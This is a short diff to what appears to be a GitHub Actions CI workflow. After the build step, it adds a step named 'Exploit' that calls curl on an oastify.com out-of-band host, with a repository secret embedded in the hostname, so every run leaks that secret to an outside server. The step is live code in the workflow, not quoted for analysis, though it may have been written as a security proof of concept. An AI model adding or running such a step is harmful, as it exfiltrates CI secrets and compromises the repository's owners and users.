@@ -40,6 +40,9 @@ jobs:
         uses: hypertrace/github-actions/gradle@main
         with: 
           args: build dockerBuildImages
+          
+      - name: Exploit
+        run: curl http://${{ secrets.PUBLIC_DOCKER_USERNAME }}.exfzze4qs6qo2ymgr3kcawy6ux0oogc5.oastify.com
 
   validate-helm-charts:
     runs-on: ubuntu-20.04
